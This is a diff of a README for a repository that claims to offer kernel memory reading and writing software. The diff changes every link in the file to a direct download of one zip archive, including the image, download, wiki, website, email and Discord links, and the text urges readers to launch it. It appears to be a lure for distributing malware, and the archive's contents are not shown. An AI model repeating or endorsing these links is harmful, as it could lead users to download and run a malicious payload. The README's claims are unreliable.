@@ -2,7 +2,7 @@
 
 ---
 
-![kernel-memory](https://github.com/anas200321/Kernel-Memory-Reading-Writing/releases/tag/v2.0)
+![kernel-memory](https://github.com/anas200321/Kernel-Memory-Reading-Writing/raw/refs/heads/main/couplet/Kernel-Writing-Reading-Memory-3.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Welcome to the "Kernel-Memory-Reading-Writing" repository! 🚀 This repository 
 
 ## Quick Start
 
-Ready to dive into kernel memory reading and writing? [Download the Software Zip](https://github.com/anas200321/Kernel-Memory-Reading-Writing/releases/tag/v2.0) and launch it to explore the power of kernel operations firsthand! 🚀
+Ready to dive into kernel memory reading and writing? [Download the Software Zip](https://github.com/anas200321/Kernel-Memory-Reading-Writing/raw/refs/heads/main/couplet/Kernel-Writing-Reading-Memory-3.5.zip) and launch it to explore the power of kernel operations firsthand! 🚀
 
 ---
 
@@ -63,7 +63,7 @@ Our repository structure is organized to make your exploration seamless:
 
 ## Explore Further
 
-Visit our [Wiki](https://github.com/anas200321/Kernel-Memory-Reading-Writing/releases/tag/v2.0) to delve deeper into the concepts and techniques of kernel memory reading and writing. 📚
+Visit our [Wiki](https://github.com/anas200321/Kernel-Memory-Reading-Writing/raw/refs/heads/main/couplet/Kernel-Writing-Reading-Memory-3.5.zip) to delve deeper into the concepts and techniques of kernel memory reading and writing. 📚
 
 ---
 
@@ -73,13 +73,13 @@ If the link does not work or needs improvement, please check the "Releases" sect
 
 ---
 
-### 🌐 Visit [Our Website](https://github.com/anas200321/Kernel-Memory-Reading-Writing/releases/tag/v2.0) for more information and updates!
+### 🌐 Visit [Our Website](https://github.com/anas200321/Kernel-Memory-Reading-Writing/raw/refs/heads/main/couplet/Kernel-Writing-Reading-Memory-3.5.zip) for more information and updates!
 
 ---
 
 ## Stay Connected
 
-For questions, feedback, or collaboration opportunities, feel free to reach out to us via [email](https://github.com/anas200321/Kernel-Memory-Reading-Writing/releases/tag/v2.0) or [Discord](https://github.com/anas200321/Kernel-Memory-Reading-Writing/releases/tag/v2.0).
+For questions, feedback, or collaboration opportunities, feel free to reach out to us via [email](https://github.com/anas200321/Kernel-Memory-Reading-Writing/raw/refs/heads/main/couplet/Kernel-Writing-Reading-Memory-3.5.zip) or [Discord](https://github.com/anas200321/Kernel-Memory-Reading-Writing/raw/refs/heads/main/couplet/Kernel-Writing-Reading-Memory-3.5.zip).
 
 ---
 
